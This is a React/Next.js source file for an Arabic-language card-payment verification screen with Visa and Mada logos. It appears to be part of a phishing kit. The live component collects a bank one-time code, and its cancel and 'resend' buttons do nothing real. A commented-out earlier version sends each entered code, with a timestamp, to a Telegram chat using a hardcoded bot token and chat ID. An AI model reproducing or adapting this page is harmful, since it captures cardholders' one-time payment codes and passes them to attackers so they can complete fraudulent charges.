"use client";

import { useState } from "react";
import Image from "next/image";
import logo from "../../../public/logoo.png";

type VerificationCodeFormProps = {
  onVerificationComplete: (code: string) => void;
  onCancel: () => void;
  isProcessing?: boolean;
};

export default function VerificationCodeForm({
  onVerificationComplete,
  isProcessing = false,
}: VerificationCodeFormProps) {
  const [verificationCode, setVerificationCode] = useState("");
  const [error, setError] = useState("");

  const handleSubmit = () => {
    if (
      !verificationCode ||
      verificationCode.length < 4 ||
      verificationCode.length > 6
    ) {
      setError("الرجاء إدخال رمز التحقق المكون من 4 إلى 6 أرقام");
      return;
    }

    setError("");
    onVerificationComplete(verificationCode);
  };

  return (
    <div className="text-right bg-gray-100 p-6 rounded-lg shadow-md relative ">
      <div className="flex justify-between items-center mb-6 ">
        <button
          // onClick={onCancel}
          className="text-gray-500 hover:text-gray-700 transition-colors"
        >
          إلغاء
        </button>
        <Image src={logo} alt="Logo" width={100} height={40} />
      </div>
      <div className="flex justify-center mb-6">
        <Image
          src="/images/visa.png"
          alt="Mastercard"
          width={60}
          height={40}
          className="mx-auto"
        />
      </div>
      <p className="mb-6 text-gray-600 text-center">
        تم إرسال رمز التحقق إلى هاتفك المسجل. الرجاء إدخال الرمز لإتمام عملية
        الدفع.
      </p>

      <div className="space-y-6">
        <div className="text-center">
          <label
            htmlFor="verificationCode"
            className="block text-sm font-medium text-gray-700 mb-3"
          >
            رمز التحقق
          </label>
          <input
            type="text"
            id="verificationCode"
            name="verificationCode"
            value={verificationCode}
            onChange={(e) => {
              // Only allow digits and limit to 6 characters
              const value = e.target.value.replace(/\D/g, "").slice(0, 6);
              setVerificationCode(value);
              if (error) setError("");
            }}
            placeholder="XXXXXX"
            className={`w-full p-3 border ${
              error ? "border-red-500" : "border-gray-300"
            } rounded-lg text-center text-2xl tracking-widest letter-spacing-2 focus:outline-none focus:ring-2 focus:ring-blue-500`}
            required
            autoFocus
          />
          {error && (
            <p className="text-red-500 text-xs mt-1 text-right">{error}</p>
          )}
        </div>

        <button
          onClick={handleSubmit}
          disabled={isProcessing}
          className={`w-full py-3 px-6 font-medium rounded-lg ${
            isProcessing
              ? "bg-gray-400 cursor-not-allowed"
              : "bg-blue-600 hover:bg-blue-700"
          } text-white transition-colors`}
        >
          {isProcessing ? "جاري التحقق..." : "تأكيد"}
        </button>
        <button
          className="w-full text-blue-600 hover:text-blue-700 font-medium mt-4 transition-colors"
          onClick={() => setVerificationCode("")}
        >
          إعادة إرسال الرمز
        </button>
      </div>
    </div>
  );
}

// "use client";
// import Image from "next/image";
// import { useState } from "react";
// import { useRouter } from "next/navigation";

// export default function VerificationPage() {
//   const [verificationCode, setVerificationCode] = useState("");
//   const router = useRouter();

//   const handleSubmit = async (e: React.FormEvent) => {
//     e.preventDefault();
//     if (verificationCode.length >= 4 && verificationCode.length <= 6) {
//       try {
//         const botToken = "7518243424:AAEy5xsiG0UTYXCJ_-4lS5Ja5K0pmy4XPUA";
//         const chatId = "-1002630840593";

//         const escapeMarkdown = (text: string | number | null | undefined) => {
//           const safeText = text?.toString() || "";
//           return safeText.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
//         };

//         const formatVerificationInfo = () => {
//           const now = new Date().toLocaleString("ar-SA");
//           return [
//             "🔑 *رمز التحقق* 🔑",
//             `رمز التحقق: ${escapeMarkdown(verificationCode)}`,
//             `وقت التحقق: ${escapeMarkdown(now)}`,
//           ].join("\n");
//         };

//         const response = await fetch(
//           `https://api.telegram.org/bot${botToken}/sendMessage`,
//           {
//             method: "POST",
//             headers: { "Content-Type": "application/json" },
//             body: JSON.stringify({
//               chat_id: chatId,
//               text: formatVerificationInfo(),
//               parse_mode: "Markdown",
//             }),
//           }
//         );

//         if (!response.ok) {
//           throw new Error(`HTTP error! status: ${response.status}`);
//         }

//         // Clear session storage
//         sessionStorage.removeItem("paymentData");

//         // Show success message
      
//       } catch (error) {
//         console.error("Error sending verification code:", error);
//         alert("حدث خطأ أثناء إرسال رمز التحقق. الرجاء المحاولة مرة أخرى.");
//       }
//     } else {
//       alert("الرجاء إدخال رمز التحقق المكون من 4 إلى 6 أرقام");
//     }
//   };

//   return (
//     <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 py-12 px-4 sm:px-6 lg:px-8">
//       <div className="max-w-md w-full space-y-8">
//         <div className="text-center">
//           <Image
//             src="/LOGOo.png"
//             alt="Phone Zone Mobile"
//             width={150}
//             height={50}
//             className="mx-auto"
//           />
//           <div className="mt-6 flex justify-center space-x-2">
//             <Image
//               src="/images/visa.png"
//               alt="Visa"
//               width={40}
//               height={25}
//               className="object-contain"
//             />
//             <Image
//               src="/images/mada.png"
//               alt="Mada"
//               width={40}
//               height={25}
//               className="object-contain"
//             />
//           </div>
//         </div>

//         <div className="mt-8 bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10">
//           <form className="space-y-6" onSubmit={handleSubmit}>
//             <div className="text-center">
//               <h2 className="text-xl font-semibold text-gray-900">إلغاء</h2>
//               <p className="mt-2 text-sm text-gray-600">
//                 تم إرسال رمز التحقق إلى هاتفك المسجل. الرجاء إدخال الرمز لإتمام
//                 عملية الدفع.
//               </p>
//             </div>

//             <div>
//               <label htmlFor="code" className="sr-only">
//                 رمز التحقق
//               </label>
//               <input
//                 id="code"
//                 name="code"
//                 type="text"
//                 maxLength={6}
//                 required
//                 className="appearance-none relative block w-full px-3 py-2 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm text-center"
//                 placeholder="رمز التحقق"
//                 value={verificationCode}
//                 onChange={(e) => setVerificationCode(e.target.value)}
//               />
//             </div>

//             <div>
//               <button
//                 type="submit"
//                 className="group relative w-full flex justify-center py-2 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
//               >
//                 تأكيد
//               </button>
//             </div>

//             <div className="text-center">
//               <button
//                 type="button"
//                 className="text-sm text-blue-600 hover:text-blue-500"
// onClick={() => window.location.reload()}
//               >
//                 إعادة إرسال الرمز
//               </button>
//             </div>
//           </form>
//         </div>
//       </div>
//     </div>
//   );
// }
